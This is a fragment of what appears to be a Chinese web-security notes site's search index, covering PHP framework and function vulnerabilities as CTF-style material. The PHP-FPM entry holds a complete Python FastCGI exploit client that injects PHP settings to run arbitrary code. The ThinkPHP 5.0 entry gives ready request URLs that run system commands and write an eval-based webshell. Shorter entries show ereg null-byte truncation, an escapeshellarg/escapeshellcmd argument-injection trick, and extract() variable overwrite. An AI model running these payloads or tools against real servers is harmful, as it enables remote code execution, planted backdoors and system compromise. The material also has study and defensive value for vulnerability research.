<p>\u8fd9\u53c8\u6d89\u53ca\u5230PHP-FPM\u7684\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\uff0c<code>PHP_VALUE</code>\u548c<code>PHP_ADMIN_VALUE</code>\u3002\u8fd9\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\u5c31\u662f\u7528\u6765\u8bbe\u7f6ePHP\u914d\u7f6e\u9879\u7684\uff0c<code>PHP_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6a21\u5f0f\u4e3a<code>PHP_INI_USER</code>\u548c<code>PHP_INI_ALL</code>\u7684\u9009\u9879\uff0c<code>PHP_ADMIN_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6240\u6709\u9009\u9879\u3002\uff08<code>disable_functions</code>\u9664\u5916\uff0c\u8fd9\u4e2a\u9009\u9879\u662fPHP\u52a0\u8f7d\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u4e86\uff0c\u5728\u8303\u56f4\u5185\u7684\u51fd\u6570\u76f4\u63a5\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u5230PHP\u4e0a\u4e0b\u6587\u4e2d\uff09</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u6700\u540e\u4f20\u5165\u5982\u4e0b\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\n</code></pre> <p>\u8bbe\u7f6e<code>auto_prepend_file = php://input</code>\u4e14<code>allow_url_include = On</code>\uff0c\u7136\u540e\u5c06\u6211\u4eec\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u5373\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#exp","title":"EXP\u7f16\u5199","text":"<p>\u4e0a\u56fe\u4e2d\u7528\u5230\u7684EXP\uff0c\u5c31\u662f\u6839\u636e\u4e4b\u524d\u4ecb\u7ecd\u7684fastcgi\u534f\u8bae\u6765\u7f16\u5199\u7684\uff0c\u4ee3\u7801\u5982\u4e0b\uff1ahttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 \u3002\u517c\u5bb9Python2\u548cPython3\uff0c\u65b9\u4fbf\u5728\u5185\u7f51\u7528\u3002</p> <p>\u4ee3\u7801\uff1a</p> <pre><code>import socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\nimport base64\nimport urllib\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\nPY2 = True if sys.version_info.major == 2 else False\ndef bchr(i):\nif PY2:\nreturn force_bytes(chr(i))\nelse:\nreturn bytes([i])\ndef bord(c):\nif isinstance(c, int):\nreturn c\nelse:\nreturn ord(c)\ndef force_bytes(s):\nif isinstance(s, bytes):\nreturn s\nelse:\nreturn s.encode('utf-8', 'strict')\ndef force_text(s):\nif issubclass(type(s), str):\nreturn s\nif isinstance(s, bytes):\ns = str(s, 'utf-8', 'strict')\nelse:\ns = str(s)\nreturn s\nclass FastCGIClient:\n\"\"\"A Fast-CGI Client for Python\"\"\"\n# private\n__FCGI_VERSION = 1\n__FCGI_ROLE_RESPONDER = 1\n__FCGI_ROLE_AUTHORIZER = 2\n__FCGI_ROLE_FILTER = 3\n__FCGI_TYPE_BEGIN = 1\n__FCGI_TYPE_ABORT = 2\n__FCGI_TYPE_END = 3\n__FCGI_TYPE_PARAMS = 4\n__FCGI_TYPE_STDIN = 5\n__FCGI_TYPE_STDOUT = 6\n__FCGI_TYPE_STDERR = 7\n__FCGI_TYPE_DATA = 8\n__FCGI_TYPE_GETVALUES = 9\n__FCGI_TYPE_GETVALUES_RESULT = 10\n__FCGI_TYPE_UNKOWNTYPE = 11\n__FCGI_HEADER_SIZE = 8\n# request state\nFCGI_STATE_SEND = 1\nFCGI_STATE_ERROR = 2\nFCGI_STATE_SUCCESS = 3\ndef __init__(self, host, port, timeout, keepalive):\nself.host = host\nself.port = port\nself.timeout = timeout\nif keepalive:\nself.keepalive = 1\nelse:\nself.keepalive = 0\nself.sock = None\nself.requests = dict()\ndef __connect(self):\nself.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself.sock.settimeout(self.timeout)\nself.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# if self.keepalive:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n# else:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\ntry:\nself.sock.connect((self.host, int(self.port)))\nexcept socket.error as msg:\nself.sock.close()\nself.sock = None\nprint(repr(msg))\nreturn False\nreturn True\ndef __encodeFastCGIRecord(self, fcgi_type, content, requestid):\nlength = len(content)\nbuf = bchr(FastCGIClient.__FCGI_VERSION) \\\n+ bchr(fcgi_type) \\\n+ bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(requestid &amp; 0xFF) \\\n+ bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(length &amp; 0xFF) \\\n+ bchr(0) \\\n+ bchr(0) \\\n+ content\nreturn buf\ndef __encodeNameValueParams(self, name, value):\nnLen = len(name)\nvLen = len(value)\nrecord = b''\nif nLen &lt; 128:\nrecord += bchr(nLen)\nelse:\nrecord += bchr((nLen &gt;&gt; 24) | 0x80) \\\n+ bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(nLen &amp; 0xFF)\nif vLen &lt; 128:\nrecord += bchr(vLen)\nelse:\nrecord += bchr((vLen &gt;&gt; 24) | 0x80) \\\n+ bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(vLen &amp; 0xFF)\nreturn record + name + value\ndef __decodeFastCGIHeader(self, stream):\nheader = dict()\nheader['version'] = bord(stream[0])\nheader['type'] = bord(stream[1])\nheader['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\nheader['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\nheader['paddingLength'] = bord(stream[6])\nheader['reserved'] = bord(stream[7])\nreturn header\ndef __decodeFastCGIRecord(self, buffer):\nheader = buffer.read(int(self.__FCGI_HEADER_SIZE))\nif not header:\nreturn False\nelse:\nrecord = self.__decodeFastCGIHeader(header)\nrecord['content'] = b''\nif 'contentLength' in record.keys():\ncontentLength = int(record['contentLength'])\nrecord['content'] += buffer.read(contentLength)\nif 'paddingLength' in record.keys():\nskiped = buffer.read(int(record['paddingLength']))\nreturn record\ndef request(self, nameValuePairs={}, post=''):\nif not self.__connect():\nprint('connect failure! please check your fasctcgi-server !!')\nreturn\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nself.sock.send(request)\nself.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\nself.requests[requestId]['response'] = b''\nreturn self.__waitForResponse(requestId)\ndef gopher(self, nameValuePairs={}, post=''):\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nreturn request\ndef __waitForResponse(self, requestId):\ndata = b''\nwhile True:\nbuf = self.sock.recv(512)\nif not len(buf):\nbreak\ndata += buf\ndata = BytesIO(data)\nwhile True:\nresponse = self.__decodeFastCGIRecord(data)\nif not response:\nbreak\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\nor response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nself.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\nif requestId == int(response['requestId']):\nself.requests[requestId]['response'] += response['content']\nif response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\nself.requests[requestId]\nreturn self.requests[requestId]['response']\ndef __repr__(self):\nreturn \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\nparser.add_argument('host', help='Target host, such as 127.0.0.1')\nparser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\nparser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;')\nparser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\nparser.add_argument('-e', '--ext', help='ext absolute path', default='')\nparser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')\nparser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)\nparser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)\nargs = parser.parse_args()\nclient = FastCGIClient(args.host, args.port, 3, 0)\nparams = dict()\ndocumentRoot = \"/\"\nuri = args.file\nparams = {\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'POST',\n'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n'SCRIPT_NAME': uri,\n'QUERY_STRING': '',\n'REQUEST_URI': uri,\n'DOCUMENT_ROOT': documentRoot,\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '9985',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1',\n'CONTENT_TYPE': 'application/text',\n'CONTENT_LENGTH': \"%d\" % len(args.code),\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\nif args.ext and args.include_file:\n#params['PHP_ADMIN_VALUE']='extension = '+args.ext\nparams['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\"\nparams['PHP_VALUE']='auto_prepend_file = '+args.include_file\nif not args.url_format and not args.base64_format :\nresponse = client.request(params, args.code)\nprint(force_text(response))\nelse:\nresponse = client.gopher(params, args.code)\nif args.url_format:\nprint(urllib.quote(response))\nif args.base64_format:\nprint(base64.b64encode(response))\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp5.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Thinkphp5.0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6f0f\u6d1e\u539f\u7406</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790_tdcoming'blog-CSDN\u535a\u5ba2_thinkphp\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5168\u7248\u672c\u901a\u6740\u672c\u6587\u4e3b\u8981\u4ee5\u5b98\u7f51\u4e0b\u8f7d\u76845.0.23 \u5b8c\u6574\u7248(thinkphp_5.0.23_with_extend.zip)\u4e3a\u4f8b\u5206\u6790\u3002Thinkphp\u5904\u7406\u8bf7\u6c42\u7684\u5173\u952e\u7c7b\u4e3aRequest(thinkphp/library/think/Request.php)\u8be5\u7c7b\u53ef\u4ee5\u5b9e\u73b0\u5bf9HTTP\u8bf7\u6c42\u7684\u4e00\u4e9b\u8bbe\u7f6e\u3002\u5176\u4e2d\u6210\u5458\u51fd\u6570method\u7528\u6765\u83b7\u53d6\u5f53\u524d\u8bf7\u6c42\u7c7b\u578b\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a...</p> <p>https://blog.csdn.net/qq_29647709/article/details/86307859</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a</p> <p>1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c</p> <p>http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</p> <p></p> <p>2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f</p> <p>http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p> <p></p> <p>3.\u5199\u5165shell:</p> <p>http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%3C?php%20@eval($_GET[%22code%22])?%3E%3Eshell.php</p> <p></p> <p>\u6216\u8005</p> <p>http://localhost:9096/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 'ok';?&gt;</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp6.0.0-6.0.1%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Thinkphp6.0.0-6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e</p> <p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a</p> <p>\u4f20\u6f0f\u6d1e.md(2.5 KB)</p> <ul> <li>0%</li> </ul>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/assert%E6%96%AD%E8%A8%80/","title":"assert\u65ad\u8a00","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>php5\u4e2d\uff0cassert\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7f='assert';f(...);\u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u52a8\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>php7\u4e2d\uff0cassert\u4e0d\u518d\u662f\u51fd\u6570\uff0c\u53d8\u6210\u4e86\u4e00\u4e2a\u8bed\u8a00\u7ed3\u6784(\u7c7b\u4f3ceval)\uff0c\u4e0d\u80fd\u518d\u4f5c\u4e3a\u51fd\u6570\u540d\u52a8\u6001\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/ereg%E6%AD%A3%E5%88%99%2500%E6%88%AA%E6%96%AD/","title":"ereg\u6b63\u5219%00\u622a\u65ad","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>&lt;?php\n$flag = \"flag\";\nif (isset ($_GET['nctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\necho '\u5fc5\u987b\u8f93\u5165\u6570\u5b57\u624d\u884c';\nelse if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '\u9a9a\u5e74\uff0c\u7ee7\u7eed\u52aa\u529b\u5427\u554a~';\n}\n?&gt;\nPlain Text\n</code></pre> <p>ereg\u51fd\u6570\u9047\u5230%00\u4f1a\u8ba4\u4e3a\u51fd\u6570\u6267\u884c\u5b8c\u6bd5</p> <p>http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/escapeshellarg%28%29_escapeshellcmd%28%29/","title":"escapeshellarg()+escapeshellcmd()","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>escapeshellarg\u4f1a\u5bf9\u6240\u6709\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49,\u5e76\u4e14\u7ed9\u5b57\u7b26\u4e32\u589e\u52a0\u4e00\u4e2a \u5355\u5f15\u53f7</p> <p>escapeshellcmd\u4ec5\u4f1a\u5bf9\u843d\u5355\u4e86\u7684\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\u5982\uff1a&amp; # ;` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $</p> <p>\u4f20\u5165\u7684\u53c2\u6570\u662f\uff1a172.17.0.2'-v -d a=1</p> <p>\u7ecf\u8fc7escapeshellarg\u5904\u7406\u540e\u53d8\u6210\u4e86'172.17.0.2'\\'' -v -d a=1'\uff0c\u5373\u5148\u5bf9\u5355\u5f15\u53f7\u8f6c\u4e49\uff0c\u518d\u7528\u5355\u5f15\u53f7\u5c06\u5de6\u53f3\u4e24\u90e8\u5206\u62ec\u8d77\u6765\u4ece\u800c\u8d77\u5230\u8fde\u63a5\u7684\u4f5c\u7528\u3002</p> <p>\u7ecf\u8fc7escapeshellcmd\u5904\u7406\u540e\u53d8\u6210'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u8fd9\u662f\u56e0\u4e3aescapeshellcmd\u5bf9\\\u4ee5\u53ca\u6700\u540e\u90a3\u4e2a\u4e0d\u914d\u5bf9\u513f\u7684\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49\uff1ahttp://php.net/manual/zh/function.escapeshellcmd.php</p> <p>\u6700\u540e\u6267\u884c\u7684\u547d\u4ee4\u662fcurl'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u7531\u4e8e\u4e2d\u95f4\u7684\\\u88ab\u89e3\u91ca\u4e3a\\\u800c\u4e0d\u518d\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u540e\u9762\u7684'\u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u4e0e\u518d\u540e\u9762\u7684'\u914d\u5bf9\u513f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u8fde\u63a5\u7b26\u3002\u6240\u4ee5\u53ef\u4ee5\u7b80\u5316\u4e3acurl 172.17.0.2 -v -da=1'\uff0c\u5373\u5411172.17.0.2\\\u53d1\u8d77\u8bf7\u6c42\uff0cPOST \u6570\u636e\u4e3aa=1'\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/","title":"extract\u53d8\u91cf\u8986\u76d6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5b8c\u5168\u53ef\u4ee5\u81ea\u5df1\u642d\u4e2a\u73af\u5883\u6765\u73a9\uff0c\u52a0\u6761highligh_file(\"index.php\")</p> <pre><code>&lt;?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\nif($shiyan==$content)\n{\necho'ctf{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u5b9a\u4e49\u548c\u7528\u6cd5</p> <p>extract() \u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\u3002</p> <p>\u8be5\u51fd\u6570\u4f7f\u7528\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4f7f\u7528\u6570\u7ec4\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u503c\u3002\u9488\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u5c06\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u521b\u5efa\u5bf9\u5e94\u7684\u4e00\u4e2a\u53d8\u91cf\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570type\u7528\u4e8e\u6307\u5b9a\u5f53\u67d0\u4e2a\u53d8\u91cf\u5df2\u7ecf\u5b58\u5728\uff0c\u800c\u6570\u7ec4\u4e2d\u53c8\u6709\u540c\u540d\u5143\u7d20\u65f6\uff0cextract() \u51fd\u6570\u5982\u4f55\u5bf9\u5f85\u8fd9\u6837\u7684\u51b2\u7a81\u3002</p> <p>\u8be5\u51fd\u6570\u8fd4\u56de\u6210\u529f\u5bfc\u5165\u5230\u7b26\u53f7\u8868\u4e2d\u7684\u53d8\u91cf\u6570\u76ee\u3002</p> <p>http://127.0.0.1/Php_Bug/extract1.php?shiyan=&amp;flag=1</p> <p>\u7565\u5fae\u89e3\u91ca</p> <p>\u9996\u5148\u662fisset,\u53ea\u68c0\u67e5\u53d8\u91cf\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u4f1a\u53bb\u68c0\u67e5\u53d8\u91cf\u7684\u503c\u4e3a\u7a7a\u6216\u8005\u4ec0\u4e48\u5176\u4ed6\u7684\u4e1c\u897f</p> <p>\u7136\u540efile_get_contents\u5f53\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u65f6\u5019\u7684\u8fd4\u56de\u662f\u4e2a0,\u7136\u540e\u7a7a=0</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/","title":"get_header()","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: 